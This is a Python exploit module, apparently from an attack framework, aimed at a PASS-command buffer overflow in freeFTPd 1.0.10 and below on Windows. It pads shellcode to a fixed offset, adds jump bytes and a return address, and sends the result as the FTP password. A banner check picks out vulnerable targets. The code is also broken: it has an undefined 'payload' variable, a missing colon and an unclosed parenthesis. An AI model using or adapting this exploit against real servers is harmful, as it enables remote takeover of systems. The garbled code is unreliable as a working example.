import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class freeftpdPassOverflowMenu(core.Exploit):
  def generate(self, p):
    off = 702
    p += self.get_shellcode()
    p += self.rand_text(off - len(p))
    p += "\xe9=\xfd\xff\xff"
    p += "\xeb\xf9"
    p += self.rand_text(2)
    payload += "\xbb\x14\x40\x00"
  def deliver(self, p)
    self.init_deliver()
    s = self.connect()
    s.send("USER " + self.variables["user"]
    s.recv(1024)
    s.send("PASS " + payload)
    s.close()
  def check(self):
    self.disconnect(self.connect())
    if "freeFTPd 1.0" in self.banner[0]:
      self.check_vuln()
    else:
      self.check_safe()
def main():
  freeftpdpassoverflowmenu = freeftpdPassOverflowMenu("freeftpd_pass_overflow", "freeFTPd 1.0.10 and below on Windows", "freeftpd_pass.shell", {"user":"anonymous", "host":""}, {"user":"the user to use", "host":"the IP of the target"}, [True])
  freeftpdpassoverflowmenu.cmdloop("pdf-console attack(freeftpd_pass_overflow)% ")
if __name__ == '__main__':
  main()
